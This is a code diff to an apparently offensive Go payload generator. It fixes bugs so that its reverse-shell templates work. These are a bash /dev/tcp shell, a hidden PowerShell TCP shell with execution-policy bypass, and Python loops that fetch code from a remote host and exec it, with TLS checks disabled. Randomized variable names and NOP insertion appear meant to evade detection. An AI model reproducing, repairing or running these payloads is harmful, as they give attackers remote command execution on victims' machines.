@@ -182,8 +182,8 @@ func (g *AdvancedPayloadGenerator) buildTCPBashPayload(ip, port string, vars map
 			vars["ip_var"], ip, vars["port_var"], port, vars["ip_var"], vars["port_var"]),
 
 		// Variant 3: Process substitution with randomization
-		fmt.Sprintf(`bash -c 'exec %s<>/dev/tcp/%s/%s; cat <&%s | while read %s; do $%s %s>&%s >&%s; done'`,
-			vars["fd_var"], ip, port, vars["fd_var"], vars["line_var"], vars["line_var"], vars["fd_var"], vars["fd_var"]),
+		fmt.Sprintf(`bash -c 'exec %s<>/dev/tcp/%s/%s; cat <&%s | while read %s; do $%s <&%s >&%s 2>&%s; done'`,
+			vars["fd_var"], ip, port, vars["fd_var"], vars["line_var"], vars["line_var"], vars["fd_var"], vars["fd_var"], vars["fd_var"]),
 
 		// Variant 4: Base64 encoded command
 		fmt.Sprintf(`bash -c '$(echo %s | base64 -d)'`, base64.StdEncoding.EncodeToString([]byte(
@@ -241,7 +241,7 @@ pty.spawn('/bin/bash')
 func (g *AdvancedPayloadGenerator) buildTCPPowershellPayload(ip, port string, vars map[string]string) string {
 	variants := []string{
 		// Standard PowerShell
-		fmt.Sprintf(`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("%s",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, ip, port),
+		fmt.Sprintf(`powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("%s",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, ip, port),
 
 		// Variable-based PowerShell
 		fmt.Sprintf(`powershell -Command "$%s='%s';$%s=%s;%s"`,
@@ -283,7 +283,7 @@ import requests,subprocess,os,time
 %s=%s
 while True:
     try:
-        r=requests.get('http://'%s':%s/payload',timeout=5)
+        r=requests.get('http://%s:%s/payload',timeout=5)
         if r.status_code==200:
             exec(r.text)
     except:pass
@@ -300,7 +300,7 @@ urllib3.disable_warnings()
 %s=%s
 while True:
     try:
-        r=requests.get('https://'%s':%s/payload',timeout=5,verify=False)
+        r=requests.get('https://%s:%s/payload',timeout=5,verify=False)
         if r.status_code==200:
             exec(r.text)
     except:pass
@@ -316,6 +316,7 @@ func (g *AdvancedPayloadGenerator) generateRandomVariableSet() map[string]string
 		"port_var": g.generateRandomVarName(),
 		"fd_var":   g.generateRandomVarName(),
 		"line_var": g.generateRandomVarName(),
+		"loop_var": g.generateRandomVarName(),
 		"ps_ip":    g.generateRandomVarName(),
 		"ps_port":  g.generateRandomVarName(),
 		"nop1":     g.generateRandomNOP(),
